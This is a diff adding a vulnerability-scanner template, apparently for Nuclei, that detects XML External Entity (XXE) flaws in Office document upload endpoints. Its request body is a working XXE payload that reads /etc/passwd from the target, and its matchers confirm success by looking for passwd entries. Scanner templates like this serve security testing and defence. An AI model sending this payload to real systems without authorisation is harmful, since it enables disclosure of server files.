@@ -1,0 +1,36 @@
+id: xxe-xlsx-upload
+info:
+  name: XXE via XLSX/Office Document Upload
+  author: AniipID
+  severity: high
+  description: Detects XXE through Office Open XML file upload (XLSX, DOCX, PPTX)
+  tags: xxe,office,xlsx,xml,upload
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/import"
+      - "{{BaseURL}}/import"
+      - "{{BaseURL}}/document/upload"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE xl:workbook [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <xl:workbook xmlns:xl="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+        <xl:sheets>
+          <xl:sheet name="Data">
+            <xl:rows>
+              <xl:row>&xxe;</xl:row>
+            </xl:rows>
+          </xl:sheet>
+        </xl:sheets>
+      </xl:workbook>
+    matchers:
+      - type: word
+        words:
+          - "root:x:"
+          - "nobody:x:"
+        condition: or
